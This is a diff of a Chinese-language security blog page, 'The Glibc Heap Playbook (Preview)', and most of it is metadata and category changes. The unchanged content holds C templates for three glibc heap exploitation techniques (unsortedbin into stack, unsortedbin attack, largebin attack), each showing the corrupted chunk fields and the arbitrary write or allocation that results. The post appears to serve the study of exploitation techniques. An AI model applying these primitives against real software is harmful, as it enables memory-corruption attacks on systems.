@@ -72,7 +72,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">
 
 
-  <meta name="keywords" content="Hack,">
+  <meta name="keywords" content="Hexo, NexT">
 
 
 
@@ -89,14 +89,13 @@
 
 
 <meta name="description" content="又是适逢其时的春困。日复滋长的赖床时间和廉价咖啡因并未能击退积怨已久的黑眼圈，也只能寄希望于冷水澡和堆砌文字的无用功了。  上周读到一篇非常优秀的论文：Automatic Techniques to Systematically Discover New Heap Exploitation Primitives, 主要介绍了作者如何在各种堆管理器中自动化寻找攻击利用技巧的工作。虽然对于具体实现部">
-<meta name="keywords" content="Hack">
 <meta property="og:type" content="article">
 <meta property="og:title" content="The Glibc Heap Playbook (Preview)">
 <meta property="og:url" content="http://matshao.com/2019/03/12/The-Glibc-Heap-Playbook/index.html">
 <meta property="og:site_name" content="Mid Station">
 <meta property="og:description" content="又是适逢其时的春困。日复滋长的赖床时间和廉价咖啡因并未能击退积怨已久的黑眼圈，也只能寄希望于冷水澡和堆砌文字的无用功了。  上周读到一篇非常优秀的论文：Automatic Techniques to Systematically Discover New Heap Exploitation Primitives, 主要介绍了作者如何在各种堆管理器中自动化寻找攻击利用技巧的工作。虽然对于具体实现部">
 <meta property="og:locale" content="zh-hk">
-<meta property="og:updated_time" content="2019-03-11T16:00:36.067Z">
+<meta property="og:updated_time" content="2019-04-11T15:58:03.133Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="The Glibc Heap Playbook (Preview)">
 <meta name="twitter:description" content="又是适逢其时的春困。日复滋长的赖床时间和廉价咖啡因并未能击退积怨已久的黑眼圈，也只能寄希望于冷水澡和堆砌文字的无用功了。  上周读到一篇非常优秀的论文：Automatic Techniques to Systematically Discover New Heap Exploitation Primitives, 主要介绍了作者如何在各种堆管理器中自动化寻找攻击利用技巧的工作。虽然对于具体实现部">
@@ -294,7 +293,7 @@
               
                 <span class="post-meta-item-text">發表於</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-12T00:01:47+08:00">
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-12T22:46:02+08:00">
                 2019-03-12
               </time>
             
@@ -304,6 +303,28 @@
             
           </span>
 
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分類於</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Hack/" itemprop="url" rel="index">
+                    <span itemprop="name">Hack</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -351,6 +372,7 @@
 <h2 id="Unsortedbin-Into-Stack"><a href="#Unsortedbin-Into-Stack" class="headerlink" title="Unsortedbin Into Stack"></a>Unsortedbin Into Stack</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [PRE-CONDITION]</span></span><br><span class="line">    <span class="comment">// sz: any non-fastbin size</span></span><br><span class="line"><span class="comment">// [BUG] Heap Overflow</span></span><br><span class="line"><span class="comment">// [POST-CONDITION]</span></span><br><span class="line">    <span class="comment">// malloc(sz) == dst + offsetof(struct malloc_chunk, fd)</span></span><br><span class="line"><span class="keyword">void</span> *p1 = <span class="built_in">malloc</span>(sz);</span><br><span class="line"><span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(sz);</span><br><span class="line"><span class="comment">//avoid merge</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// move p2 to the unsorted bin</span></span><br><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create a fake chunk at dst</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">fake</span> = <span class="title">dst</span>;</span></span><br><span class="line"><span class="comment">// set fake-&gt;size to be the chunk size of the last allocation</span></span><br><span class="line">fake-&gt;size = malloc_size_to_chunk_size(sz);</span><br><span class="line"><span class="comment">// set fake-&gt;bk to any writable address to avoid crash</span></span><br><span class="line">fake-&gt;bk = fake;</span><br><span class="line"></span><br><span class="line"><span class="comment">// [BUG] Heap Overflow p1</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">c2</span> = <span class="title">raw_to_chunk</span>(<span class="title">p2</span>);</span></span><br><span class="line"><span class="comment">// size should be smaller than the next allocation size</span></span><br><span class="line"><span class="comment">// to avoid returning c2 in the next alloction</span></span><br><span class="line"><span class="comment">// size shouldn't be too small: </span></span><br><span class="line"><span class="comment">// bypass size&gt;2*SIZE_SZ (&gt;16 on x64) &amp;&amp; size &lt; av-&gt;system_mem.</span></span><br><span class="line">c2-&gt;size = <span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)</span><br><span class="line"><span class="comment">// set the next pointer in the unsorted bin</span></span><br><span class="line">c2-&gt;bk = fake;</span><br><span class="line"></span><br><span class="line"><span class="comment">// now unsorted bin: c2 -&gt; fake,</span></span><br><span class="line"><span class="comment">// and c2 is too small for the request.</span></span><br><span class="line"><span class="comment">// therefore, next allocation returns the fake chunk</span></span><br><span class="line">assert(<span class="built_in">malloc</span>(sz)) == fake + offsetof(struct malloc_chunk, fd));</span><br></pre></td></tr></table></figure>
 <h2 id="Unsoredbin-Attack"><a href="#Unsoredbin-Attack" class="headerlink" title="Unsoredbin Attack"></a>Unsoredbin Attack</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [PRE-CONDITION]</span></span><br><span class="line">    <span class="comment">// sz: non-fastbin size</span></span><br><span class="line">    <span class="comment">// dst: where to overwrite</span></span><br><span class="line"><span class="comment">// [BUG] Use-After-Free</span></span><br><span class="line"><span class="comment">// [POST-CONDITION] *dst -&gt; large value (e.g. 0x7ffff7dd1b78)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *p1 = <span class="built_in">malloc</span>(sz);</span><br><span class="line"><span class="comment">// avoid merge with top chunk</span></span><br><span class="line"><span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// p1 gets into unsortedbin.</span></span><br><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">chunk1</span> = <span class="title">raw_to_chunk</span>(<span class="title">p1</span>);</span></span><br><span class="line"><span class="keyword">size_t</span> target_value = chunk1-&gt;fd; <span class="comment">// (e.g. 0x7ffff7dd1b78)</span></span><br><span class="line"><span class="comment">// [BUG] Use-After-Free: overwrite p1-&gt;bk while it's in unsortedbin.</span></span><br><span class="line"><span class="comment">// x64: dst-0x10, x32: dst-0x8; </span></span><br><span class="line"><span class="comment">// chunk1-&gt;bk: p1+0x10</span></span><br><span class="line">chunk1-&gt;bk = dst<span class="number">-0x10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(sz);</span><br><span class="line">assert(*dst == target_value);</span><br></pre></td></tr></table></figure>
 <h2 id="Largebin-Attack"><a href="#Largebin-Attack" class="headerlink" title="Largebin Attack"></a>Largebin Attack</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [PRE-CONDITION]</span></span><br><span class="line">    <span class="comment">// sz1: largebin size, sz2: largebin size, sz1 &lt; sz2</span></span><br><span class="line">    <span class="comment">// dst1, dst2: where to overwrite</span></span><br><span class="line"><span class="comment">// [BUG] Heap Overflow</span></span><br><span class="line"><span class="comment">// [POST-CONDITION] *dst1, *dst2 -&gt; heap_address (e.g. 0x4057a0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *p1 = <span class="built_in">malloc</span>(sz1);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);  <span class="comment">// avoid merge</span></span><br><span class="line"><span class="comment">// sz1 &lt; sz2</span></span><br><span class="line"><span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(sz2);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">// avoid merge</span></span><br><span class="line"><span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(sz2);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">// avoid merge</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line"><span class="comment">// put p1,p2 in unsortedbin: </span></span><br><span class="line"><span class="comment">// unsortedbin_list-&gt;p2-&gt;p1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// malloc a size smaller than largebin size</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="comment">// allocate space from p1, now p2 is in larginbin and p1_remain in unsortedbin:</span></span><br><span class="line"><span class="comment">// largebin_list-&gt;p2; unsortedbin_list-&gt;p1_remain; </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p3);</span><br><span class="line"><span class="comment">// put p3 in unsortedbin:</span></span><br><span class="line"><span class="comment">// unsortedbin_list-&gt;p3-&gt;p1_reamin;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">chunk2</span> = <span class="title">raw_to_chunk</span>(<span class="title">p2</span>);</span></span><br><span class="line"><span class="comment">// [BUG] Heap Overflow or Overlap Chunk</span></span><br><span class="line"><span class="comment">// change chunk2-&gt;size smaller than its origin value, even 0 is ok.</span></span><br><span class="line">chunk2-&gt;size = new_size; <span class="comment">// new_size &lt; chunk2-&gt;size, 0 is ok</span></span><br><span class="line">chunk2-&gt;fd = <span class="number">0</span>;</span><br><span class="line">chunk2-&gt;bk = <span class="number">0</span>;</span><br><span class="line">chunk2-&gt;fd_size = dst1 - <span class="number">0x10</span>;</span><br><span class="line">chunk2-&gt;fd_size = dst2 - <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// malloc a size smaller than largebin size</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// dst1 &amp; dst2 has been overwritten with a heap address.</span></span><br><span class="line">assert(*dst1 == heap_address);</span><br><span class="line">assert(*dst2 == heap_address);</span><br></pre></td></tr></table></figure>
+
       
     </div>
 
@@ -370,12 +392,6 @@
 
 
     <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/Hack/" rel="tag"># Hack</a>
-          
-        </div>
       
 
       
@@ -462,7 +478,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">40</span>
+                <span class="site-state-item-count">41</span>
                 <span class="site-state-item-name">文章</span>
               </a>
             </div>
@@ -480,7 +496,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">14</span>
+                <span class="site-state-item-count">13</span>
                 <span class="site-state-item-name">標籤</span>
               </a>
             </div>
